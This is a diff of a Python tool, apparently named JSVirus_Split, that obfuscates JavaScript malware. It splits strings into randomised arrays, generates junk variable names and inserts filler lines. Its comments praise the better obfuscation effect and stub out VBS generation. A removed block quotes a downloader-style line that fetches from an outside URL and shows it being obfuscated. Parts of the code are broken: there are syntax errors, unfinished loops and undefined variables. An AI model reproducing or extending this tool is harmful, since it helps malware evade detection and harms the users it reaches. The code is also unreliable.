@@ -89,23 +89,93 @@ class FileRead2Write(object):
 		
 		return True
 		
-class RandomLenInStr(object):
+class RandomSequence(object):
 	def __init__(self):
 		pass
 	
-	#随机一个长度2-5的字符串	
-	def randStr(self,min,max):
+	#随机一个长度2-5的字符串,一般用作变量名	
+	def randStr_az(self,minNum=2,maxNum=5):			#判断一下大小传反了的情况
+		try:
+			randstr = ''
+			if minNum > maxNum:
+				minNum = min(minNum,maxNum)
+				maxNum = max(minNum,maxNum)
+			strLengt = random.randint(minNum,maxNum)
+			for i in range(1,strLengt,1):
+				chrTem = chr(random.randint(97,122))
+				randstr = randstr + chrTem
+			return randstr
+		except Exception as e:
+			print(e)
+			return 'ahoo'
+			pass
+		
+		
+	def randStr_AZUp(self,minNum=2,maxNum=5):
 		randstr = ''
-		strLengt = random.randint(min,max)
+		if minNum > maxNum:
+			minNum = min(minNum,maxNum)
+			maxNum = max(minNum,maxNum)
+		strLengt = random.randint(minNum,maxNum)
 		for i in range(1,strLengt,1):
-			chrTem = chr(random.randint(97,122))
+			chrTem = chr(random.randint(65,92))
 			randstr = randstr + chrTem
 		return randstr
+	
+	#应该从正常的代码列表中随机一句,当废话用,混淆效果更好.
+	#吧代码生成一个pprint py库在这调用,下版.
+	def randCodeLine(self,CodeList = []):
+		if len(CodeList) == 0:
+			CodeList.append('Life is short')
+			CodeList.append('U need the Eng')
+		return CodeList[randint(0,len(CodeList))]
+		
+	#随机生成一个数组
+	def randStrArrary(self,minNum=3,maxNum=5)
+		if minNum > maxNum:
+			minNum = min(minNum,maxNum)
+			maxNum = max(minNum,maxNum)
+		
+		arrLengt= random.randint(minNum,maxNum)
+		arrList =[]
+		for i in range(0,arrLengt,1):
+			#插入
+			arrList.append(self.randStr_az())
+		return arrList
+	
+	#随机一个function vbs的
+	def randFun_Vb(self):
+		pass
+		
+	def randFunList_Vb(self,MaxLen):
+		funList=[]
+		for i in range(0,MaxLen,1) 
+		
 
-class SplitEng(object):
+class StrSplitEng(object):
 
 	def __init__(self):
 		pass
+		
+	#分割一个line中的元素返回list.
+	def StrSplitLine(self,strForSplit):
+		result = []
+		if len(strForSplit) == 0:
+			#print(strForSplit)
+			return result
+
+		strleng = len(strForSplit)
+		if strleng <= 4:
+			result.append(strForSplit)
+		else:
+			randlen = random.randint(2,4)
+			result.append(strForSplit[:randlen])
+			tempList = StrSplitLine(strForSplit[randlen:])
+			
+			for j in tempList:
+				result.append(j)
+		return result
+	
 	
 	
 
@@ -121,35 +191,6 @@ def JSVirus_Split():
 	fpClass.WriteOutputFileEx_LineStr("This is my first refactor code!")
 	fpClass.WriteOutputFile(myInputList)
 	fpClass.WriteOutputFileEx_ListShuffle(myInputList)
-	
-	
-	'''
-	#2.以一句话为例子.
-	#效果：line11 = "fxejoplod6= woqvybd3[[yxypehn, 'gh', 'pk', 'o'][0] + ['rg', 'q', cjupryhfi][2]]([bnifpynmu, 'mj', 'e'][0], [ovfowqi, 'm', 'w'][0] , ['k', lwiju][1]);"
-	
-	#2.1先进行匹配要分割的代码放入到list中.
-	line12 = '"GET","http://kamennyigorod.ru/form.uio",  "0"'
-	line11 = 'fxejoplod6 = woqvybd3["open"]("GET","http://kamennyigorod.ru/form.uio",  "0");'
-	print(re.findall('\[("[^\[\]\(\)]+")\]',line11)) #"open"
-	print(re.findall('\(("[^\[\]\(\)]+")\)',line11)) #"GET", "http://kamennyigorod.ru/form.uio",  "0"
-	
-	#2.2构造替换字符串("open" 替换为数组字符串)
-	openArry = replaceFindStrUsArrlist(line12)
-	print(openArry)
-	
-	#2.3替换符合条件的----note:改变匹配规则为""之间的更实用.
-	#patternFang = re.compile('\[("[^\[\]\(\)]+")\]')
-	for i in re.findall('\[("[^\[\]\(\)]+")\]',line11):
-		patternFang = re.compile(i)
-		replaceTempstr = replaceFindStrUsArrlist(i)
-		line11 = patternFang.sub(replaceTempstr,line11,count=1)
-	print(line11)
-	
-	for j in re.findall('\(("[^\[\]\(\)]+")\)',line11):
-		patternFang = re.compile(j)
-		replaceTempstr = replaceFindStrUsArrlist(j)
-		line11 = patternFang.sub(replaceTempstr,line11,count=1)
-	print(line11)
 	
 	
 	#2.1替换[] 和()之间的.
@@ -192,19 +233,6 @@ def JSVirus_Split():
 			pass
 	#print(writeList2)
 	
-	
-	#4 写入并打开文件
-	#WriteResultFile(OutPath,writeList)
-	
-	
-	#4.1字节写个乱序的function
-	print(varStr)
-	random.shuffle(varStr)
-	print(varStr)
-	WriteResultFile(OutPath,varStr)
-	WriteResultFile(OutPath,writeList2)
-	
-	'''
 	os.system('"D:\\Program Files (x86)\\Notepad++\\notepad++.exe" ' + OutPath)
 	print('The Code has been Splited,there is my advice! Thanks!')
 	return True	
@@ -238,13 +266,10 @@ def replaceFindStrUsArrlist(findstr):
 def replaceListItemUsArrary(listItem):
 	
 	#对分割后数组的某个元素进行替换:随机数组长度.(index = random -1)
-	arrLengt= random.randint(3,5)
+	
 	index 	= random.randint(0,arrLengt-1)
 	
-	arrList =[]
-	for i in range(0,arrLengt,1):
-		#插入
-		arrList.append(randStr(2,5))
+	
 		
 	#v0.6
 	varName = randStr(3,7)
@@ -271,26 +296,6 @@ def replaceListItemUsArrary(listItem):
 	return replaceTemp
 
 
-
-#分割一个line中的元素返回list.
-def StrSplitLine(strForSplit):
-	result = []
-	if len(strForSplit) == 0:
-		#print(strForSplit)
-		return result
-
-	strleng = len(strForSplit)
-	if strleng <= 4:
-		result.append(strForSplit)
-	else:
-		randlen = random.randint(2,4)
-		result.append(strForSplit[:randlen])
-		tempList = StrSplitLine(strForSplit[randlen:])
-		
-		for j in tempList:
-			result.append(j)
-	return result
-	
 
 #分割一个list中的元素返回list.	
 def StrSplit(strForSplit = []):
@@ -332,13 +337,6 @@ def StrSplit(strForSplit = []):
 # var addr = "new Function("a", "b", "return a+b;");"
 
 #v0.8---先不用开发了,有时间做个重构和优化吧.
-
-
-def RandFun():
-	funlist = []
-	
-	
-	return funlist
 	
 
 
